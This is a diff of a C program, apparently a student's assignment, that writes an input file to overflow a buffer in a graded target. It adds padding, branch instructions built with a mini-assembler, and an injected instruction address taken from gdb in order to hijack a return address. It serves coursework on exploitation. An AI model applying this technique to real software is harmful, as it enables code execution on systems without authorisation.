@@ -25,11 +25,11 @@ int main() {
     /* write name and null terminator to file. 
     grader program will ... */ 
     fwrite("Claire Shin", 1, 11, file);
-    fputc('\0', file);
+    // fputc('\0', file);
 
     /* add padding so that buffer overflow can be performed 
     48 - 11 (length of name)= 37. */ 
-    for (int i = 0; i < 37; i++) {
+    for (int i = 0; i < 36; i++) {
         fputc('A', file);
     }
 
@@ -45,7 +45,7 @@ int main() {
     /* B back to return address */ 
     /* 0x40087c is instruction address after getName returns
     0xffffffffea48 is the injected instruction address based on gdb */
-    B = MiniAssembler_b(0x400864, 0xffffffffea48);
+    B = MiniAssembler_b(0x40087c, 0xffffffffea48);
     fwrite(&B, sizeof(unsigned int), 1, file);
 
     fclose(file);
